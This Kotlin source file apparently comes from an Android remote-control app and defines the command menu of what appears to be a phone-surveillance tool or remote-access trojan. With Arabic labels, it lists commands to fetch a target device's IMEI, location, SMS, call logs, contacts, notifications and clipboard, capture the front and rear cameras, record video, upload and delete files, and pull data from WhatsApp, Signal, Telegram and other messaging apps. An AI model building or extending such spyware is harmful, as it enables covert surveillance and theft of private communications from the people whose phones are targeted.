package com.abuzahra.control.data.repository

import com.abuzahra.control.data.model.ActionItem

class CommandRepository {

    fun getDeviceInfoActions(): List<ActionItem> = listOf(
        ActionItem("info", "معلومات الجهاز", "get_info", category = "info"),
        ActionItem("battery", "البطارية", "get_battery", category = "info"),
        ActionItem("location", "الموقع", "get_location", category = "info"),
        ActionItem("wifi", "معلومات WiFi", "get_wifi_info", category = "info"),
        ActionItem("signal", "معلومات الشبكة", "get_network_info", category = "info"),
        ActionItem("storage", "معلومات التخزين", "get_storage_info", category = "info"),
        ActionItem("sim", "معلومات SIM", "get_sim_info", category = "info"),
        ActionItem("apps", "التطبيقات المثبتة", "get_installed_apps", category = "info"),
        ActionItem("running", "التطبيقات المشغلة", "get_running_apps", category = "info"),
        ActionItem("imei", "رقم IMEI", "get_imei", category = "info")
    )

    fun getCameraActions(): List<ActionItem> = listOf(
        ActionItem("screenshot", "لقطة شاشة", "screenshot", category = "camera"),
        ActionItem("front", "الكاميرا الأمامية", "front_camera", category = "camera"),
        ActionItem("rear", "الكاميرا الخلفية", "back_camera", category = "camera"),
        ActionItem("video", "تسجيل فيديو", "record_video", category = "camera")
    )

    fun getConnectivityActions(): List<ActionItem> = listOf(
        ActionItem("wifi_on", "تشغيل WiFi", "enable_wifi", category = "connectivity"),
        ActionItem("wifi_off", "إيقاف WiFi", "disable_wifi", category = "connectivity"),
        ActionItem("bt_on", "تشغيل البلوتوث", "enable_bluetooth", category = "connectivity"),
        ActionItem("bt_off", "إيقاف البلوتوث", "disable_bluetooth", category = "connectivity"),
        ActionItem("airplane_on", "وضع الطيران", "airplane_on", category = "connectivity"),
        ActionItem("airplane_off", "إلغاء الطيران", "airplane_off", category = "connectivity"),
        ActionItem("mobile_data_on", "تشغيل البيانات", "enable_mobile_data", category = "connectivity"),
        ActionItem("mobile_data_off", "إيقاف البيانات", "disable_mobile_data", category = "connectivity"),
        ActionItem("hotspot_on", "تشغيل نقطة الاتصال", "enable_hotspot", category = "connectivity"),
        ActionItem("hotspot_off", "إيقاف نقطة الاتصال", "disable_hotspot", category = "connectivity")
    )

    fun getAlertActions(): List<ActionItem> = listOf(
        ActionItem("ring", "تشغيل الرنين", "ring", category = "alert"),
        ActionItem("vibrate", "اهتزاز", "vibrate", category = "alert"),
        ActionItem("sound", "تشغيل صوت", "play_sound", category = "alert"),
        ActionItem("speak", "نطق نص", "speak_text", category = "alert"),
        ActionItem("notify", "إشعار تجريبي", "show_notification", category = "alert"),
        ActionItem("torch_on", "تشغيل المصباح", "torch_on", category = "alert"),
        ActionItem("torch_off", "إيقاف المصباح", "torch_off", category = "alert")
    )

    fun getSystemActions(): List<ActionItem> = listOf(
        ActionItem("lock", "قفل الهاتف", "lock_phone", category = "system"),
        ActionItem("reboot", "إعادة تشغيل", "reboot", category = "system"),
        ActionItem("power_off", "إيقاف التشغيل", "power_off", category = "system"),
        ActionItem("calendar", "التقويم", "get_calendar", category = "system"),
        ActionItem("clipboard_get", "الحافظة", "get_clipboard", category = "system"),
        ActionItem("volume_up", "رفع الصوت", "volume_up", category = "system"),
        ActionItem("volume_down", "خفض الصوت", "volume_down", category = "system"),
        ActionItem("brightness_up", "رفع السطوع", "brightness_up", category = "system"),
        ActionItem("brightness_down", "خفض السطوع", "brightness_down", category = "system"),
        ActionItem("screenshot_and_save", "لقطة شاشة + حفظ", "screenshot_save", category = "system")
    )

    fun getSmsCallsActions(): List<ActionItem> = listOf(
        ActionItem("sms", "الرسائل القصيرة", "get_sms", category = "sms"),
        ActionItem("calls", "سجل المكالمات", "get_calls", category = "sms"),
        ActionItem("contacts", "جهات الاتصال", "get_contacts", category = "sms"),
        ActionItem("notifications", "الإشعارات", "get_notifications", category = "sms"),
        ActionItem("clipboard", "الحافظة", "get_clipboard", category = "sms"),
        ActionItem("call_logs_detail", "تفاصيل المكالمات", "get_call_logs_detail", category = "sms")
    )

    fun getFileActions(): List<ActionItem> = listOf(
        ActionItem("files", "تصفح الملفات", "list_files", category = "files"),
        ActionItem("gallery", "الصور والمعرض", "get_gallery", category = "files"),
        ActionItem("search", "بحث في الملفات", "search_files", category = "files"),
        ActionItem("recent", "الملفات الأخيرة", "recent_files", category = "files"),
        ActionItem("download", "تحميل ملف", "download_file", category = "files"),
        ActionItem("upload", "رفع ملف", "upload_file", category = "files"),
        ActionItem("delete", "حذف ملف", "delete_file", category = "files")
    )

    fun getSocialAppActions(): List<ActionItem> = listOf(
        ActionItem("whatsapp", "واتساب", "get_whatsapp", category = "social"),
        ActionItem("telegram", "تليجرام", "get_telegram", category = "social"),
        ActionItem("instagram", "إنستجرام", "get_instagram", category = "social"),
        ActionItem("messenger", "ماسنجر", "get_messenger", category = "social"),
        ActionItem("snapchat", "سناب شات", "get_snapchat", category = "social"),
        ActionItem("tiktok", "تيك توك", "get_tiktok", category = "social"),
        ActionItem("twitter", "تويتر / X", "get_twitter", category = "social"),
        ActionItem("viber", "فايبر", "get_viber", category = "social"),
        ActionItem("signal", "سيجنال", "get_signal", category = "social"),
        ActionItem("facebook", "فيسبوك", "get_facebook", category = "social"),
        ActionItem("discord", "ديسكورد", "get_discord", category = "social"),
        ActionItem("line", "لاين", "get_line", category = "social"),
        ActionItem("skype", "سكايب", "get_skype", category = "social"),
        ActionItem("youtube", "يوتيوب", "get_youtube", category = "social")
    )

    fun getAllControlActions(): List<ActionItem> = listOf(
        ActionItem("header", "معلومات الجهاز", "", category = "section"),
        *getDeviceInfoActions().toTypedArray(),
        ActionItem("header", "الكاميرا والصور", "", category = "section"),
        *getCameraActions().toTypedArray(),
        ActionItem("header", "الاتصال", "", category = "section"),
        *getConnectivityActions().toTypedArray(),
        ActionItem("header", "التنبيهات", "", category = "section"),
        *getAlertActions().toTypedArray(),
        ActionItem("header", "النظام", "", category = "section"),
        *getSystemActions().toTypedArray()
    )
}
